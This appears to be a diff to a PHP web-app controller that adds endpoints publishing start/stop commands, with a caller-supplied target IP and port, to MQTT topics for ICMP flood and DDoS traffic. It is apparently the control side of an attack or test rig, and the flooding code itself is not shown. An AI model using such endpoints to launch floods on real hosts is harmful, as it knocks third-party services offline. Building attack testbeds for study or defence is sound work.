@@ -80,4 +80,42 @@ class CommandController extends Controller
 
         return response()->json(['success' => true]);
     }
+
+    public function publishIcmp(Request $request)
+    {
+        $validated = $request->validate([
+            'mode' => 'required|boolean',
+            'ip' => 'required',
+        ]);
+
+        $data = [
+            'mode' => $validated['mode'] ? 'start' : 'stop',
+            'ip' => $validated['ip'],
+        ];
+
+        $mqtt = MQTT::connection('default3');
+        $mqtt->publish('icmp/input', json_encode($data), 0);
+
+        return response()->json(['success' => true]);
+    }
+
+    public function publishDdos(Request $request)
+    {
+        $validated = $request->validate([
+            'mode' => 'required|boolean',
+            'ip' => 'required',
+            'port' => 'nullable',
+        ]);
+
+        $data = [
+            'mode' => $validated['mode'] ? 'start' : 'stop',
+            'ip' => $validated['ip'],
+            'port' => $validated['port'] ?? null,
+        ];
+
+        $mqtt = MQTT::connection('default3');
+        $mqtt->publish('ddos/input', json_encode($data), 0);
+
+        return response()->json(['success' => true]);
+    }
 }
